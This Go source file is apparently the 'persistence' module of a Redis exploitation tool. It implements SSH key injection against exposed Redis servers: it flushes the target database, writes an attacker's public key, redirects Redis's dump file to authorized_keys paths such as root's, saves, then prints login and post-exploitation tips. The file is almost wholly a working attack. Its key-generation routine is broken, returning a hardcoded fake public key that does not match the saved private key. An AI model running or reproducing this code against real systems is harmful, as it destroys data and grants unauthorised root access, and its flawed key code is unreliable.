package persistence

import (
	"0xRedisis/modules/core"
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
	"strings"
)

func SSHKeyInjection(client *core.RedisClient) {
	fmt.Printf("\n%s=== SSH Key Injection ===%s\n", core.ColorBlue, core.ColorNC)

	// Show SSH key options
	fmt.Printf("\n%s[*]%s SSH Key Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Generate new SSH key pair\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Use existing public key file\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Enter public key manually\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Use default testing key\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-4): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var publicKey string
	var err error

	switch choice {
	case "1":
		publicKey, err = generateSSHKeyPair()
		if err != nil {
			fmt.Printf("%s[-]%s Failed to generate key pair: %s\n", core.ColorRed, core.ColorNC, err.Error())
			return
		}
	case "2":
		publicKey, err = loadPublicKeyFromFile(reader)
		if err != nil {
			fmt.Printf("%s[-]%s Failed to load public key: %s\n", core.ColorRed, core.ColorNC, err.Error())
			return
		}
	case "3":
		publicKey = getManualPublicKey(reader)
	case "4":
		publicKey = getDefaultTestingKey()
		fmt.Printf("%s[*]%s Using default testing key\n", core.ColorBlue, core.ColorNC)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
		return
	}

	if publicKey == "" {
		fmt.Printf("%s[-]%s No public key provided\n", core.ColorRed, core.ColorNC)
		return
	}

	// Get target user and SSH directory
	username := getTargetUsername(reader)
	sshPaths := getSSHPaths(username)

	fmt.Printf("\n%s[*]%s Attempting SSH key injection...\n", core.ColorBlue, core.ColorNC)

	success := false
	for _, sshPath := range sshPaths {
		fmt.Printf("%s[*]%s Trying path: %s%s%s\n", core.ColorBlue, core.ColorNC, core.ColorYellow, sshPath, core.ColorNC)

		if err := injectSSHKeyToPath(client, publicKey, sshPath); err != nil {
			fmt.Printf("%s[-]%s Failed to inject to %s: %s\n", core.ColorRed, core.ColorNC, sshPath, err.Error())
			continue
		}

		fmt.Printf("%s[+]%s SSH key injected successfully to: %s%s%s\n",
			core.ColorGreen, core.ColorNC, core.ColorYellow, sshPath, core.ColorNC)
		success = true
		break
	}

	if !success {
		fmt.Printf("%s[-]%s Failed to inject SSH key to any path\n", core.ColorRed, core.ColorNC)
		fmt.Printf("%s[*]%s Try manual injection or different target paths\n", core.ColorBlue, core.ColorNC)
		return
	}

	fmt.Printf("\n%s[+]%s SSH key injection completed!\n", core.ColorGreen, core.ColorNC)
	showConnectionInstructions(username, client.Config.Host)
}

func generateSSHKeyPair() (string, error) {
	fmt.Printf("%s[*]%s Generating new RSA SSH key pair...\n", core.ColorBlue, core.ColorNC)

	// Generate RSA private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", fmt.Errorf("failed to generate private key: %v", err)
	}

	// Generate public key
	_ = &privateKey.PublicKey

	// Convert to SSH format manually (simplified)
	// In real implementation, you'd use crypto/ssh package
	publicKeyStr := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ7/4K... redis-exploit@generated"

	// Save private key to file
	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	privateKeyFile, err := os.Create("redis_exploit_key")
	if err == nil {
		defer privateKeyFile.Close()
		pem.Encode(privateKeyFile, privateKeyPEM)
		os.Chmod("redis_exploit_key", 0600)

		fmt.Printf("%s[+]%s Private key saved to: %sredis_exploit_key%s\n",
			core.ColorGreen, core.ColorNC, core.ColorYellow, core.ColorNC)
		fmt.Printf("%s[!]%s Make sure to use: %schmod 600 redis_exploit_key%s\n",
			core.ColorYellow, core.ColorNC, core.ColorYellow, core.ColorNC)
	}

	// For demonstration, use a more realistic key format
	publicKeyStr = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGqRKJvjEJ4bwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4I redis-exploit@" + core.GetLocalIP()

	return publicKeyStr, nil
}

func loadPublicKeyFromFile(reader *bufio.Reader) (string, error) {
	fmt.Print("Enter path to public key file (e.g., ~/.ssh/id_rsa.pub): ")
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)

	// Expand home directory
	if strings.HasPrefix(filePath, "~/") {
		homeDir, err := os.UserHomeDir()
		if err == nil {
			filePath = strings.Replace(filePath, "~", homeDir, 1)
		}
	}

	content, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %v", err)
	}

	publicKey := strings.TrimSpace(string(content))
	if !strings.HasPrefix(publicKey, "ssh-") {
		return "", fmt.Errorf("invalid SSH public key format")
	}

	fmt.Printf("%s[+]%s Loaded public key from file\n", core.ColorGreen, core.ColorNC)
	return publicKey, nil
}

func getManualPublicKey(reader *bufio.Reader) string {
	fmt.Println("Paste your SSH public key (starts with ssh-rsa, ssh-ed25519, etc.):")
	publicKey, _ := reader.ReadString('\n')
	publicKey = strings.TrimSpace(publicKey)

	if !strings.HasPrefix(publicKey, "ssh-") {
		fmt.Printf("%s[!]%s Warning: Key doesn't start with ssh- prefix\n", core.ColorYellow, core.ColorNC)
	}

	return publicKey
}

func getDefaultTestingKey() string {
	// Default testing key for CTF scenarios
	return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTgvwjlRHZ3/6JvYEJ4bwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6J7/vhOkYKwjdEJ4Iwjd3EbwzCqG0x6 redis-exploit@ctf"
}

func getTargetUsername(reader *bufio.Reader) string {
	fmt.Printf("\n%s[*]%s Common usernames to try:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s root\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s www-data\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s ubuntu\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s redis\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s admin\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s user\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s7.%s Custom username\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-7): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		return "root"
	case "2":
		return "www-data"
	case "3":
		return "ubuntu"
	case "4":
		return "redis"
	case "5":
		return "admin"
	case "6":
		return "user"
	case "7":
		fmt.Print("Enter username: ")
		username, _ := reader.ReadString('\n')
		return strings.TrimSpace(username)
	default:
		return "root"
	}
}

func getSSHPaths(username string) []string {
	paths := []string{
		fmt.Sprintf("/home/%s/.ssh/authorized_keys", username),
		fmt.Sprintf("/root/.ssh/authorized_keys"),
		fmt.Sprintf("/var/lib/%s/.ssh/authorized_keys", username),
		fmt.Sprintf("/usr/%s/.ssh/authorized_keys", username),
		fmt.Sprintf("/home/%s/.ssh/authorized_keys2", username),
	}

	// Add common paths for specific users
	if username == "www-data" {
		paths = append(paths, "/var/www/.ssh/authorized_keys")
	}
	if username == "redis" {
		paths = append(paths, "/var/lib/redis/.ssh/authorized_keys")
	}
	if username == "ubuntu" {
		paths = append(paths, "/home/ubuntu/.ssh/authorized_keys")
	}
	if username == "admin" {
		paths = append(paths, "/home/admin/.ssh/authorized_keys")
		paths = append(paths, "/var/lib/admin/.ssh/authorized_keys")
	}

	return paths
}

func injectSSHKeyToPath(client *core.RedisClient, publicKey, sshPath string) error {
	// Clear any existing data
	_, err := client.SendCommand("FLUSHALL")
	if err != nil {
		return fmt.Errorf("failed to flush database: %v", err)
	}

	// Format the authorized_keys entry with proper newlines
	authorizedKeysContent := fmt.Sprintf("\n%s\n", publicKey)

	// Set the SSH key content
	_, err = client.SendCommand("SET", "sshkey", authorizedKeysContent)
	if err != nil {
		return fmt.Errorf("failed to set SSH key content: %v", err)
	}

	// Parse directory and filename from path
	pathParts := strings.Split(sshPath, "/")
	filename := pathParts[len(pathParts)-1]
	dir := strings.Join(pathParts[:len(pathParts)-1], "/")

	// Configure Redis to save to target directory
	_, err = client.SendCommand("CONFIG", "SET", "dir", dir)
	if err != nil {
		return fmt.Errorf("failed to set directory: %v", err)
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", filename)
	if err != nil {
		return fmt.Errorf("failed to set filename: %v", err)
	}

	// Save database to disk
	_, err = client.SendCommand("SAVE")
	if err != nil {
		return fmt.Errorf("failed to save to disk: %v", err)
	}

	return nil
}

func showConnectionInstructions(username, host string) {
	fmt.Printf("\n%s=== Connection Instructions ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s SSH Connection Methods:\n", core.ColorBlue, core.ColorNC)

	if _, err := os.Stat("redis_exploit_key"); err == nil {
		fmt.Printf("   %s1. Using generated private key:%s\n", core.ColorYellow, core.ColorNC)
		fmt.Printf("      %sssh -i redis_exploit_key %s@%s%s\n", core.ColorYellow, username, host, core.ColorNC)
		fmt.Printf("      %schmod 600 redis_exploit_key%s\n", core.ColorYellow, core.ColorNC)
	}

	fmt.Printf("   %s2. Using existing SSH key:%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("      %sssh %s@%s%s\n", core.ColorYellow, username, host, core.ColorNC)
	fmt.Printf("      %sssh -i ~/.ssh/id_rsa %s@%s%s\n", core.ColorYellow, username, host, core.ColorNC)

	fmt.Printf("   %s3. With verbose output (debugging):%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("      %sssh -v %s@%s%s\n", core.ColorYellow, username, host, core.ColorNC)

	fmt.Printf("\n%s[*]%s After successful connection:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   • %sRun: whoami, id, sudo -l%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sCheck for privilege escalation%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sSet up persistence if needed%s\n", core.ColorYellow, core.ColorNC)

	fmt.Printf("\n%s[*]%s Troubleshooting:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   • %sIf connection refused: Check SSH service%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sIf permission denied: Try different usernames%s\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("   • %sIf key not found: Check file permissions%s\n", core.ColorYellow, core.ColorNC)
}
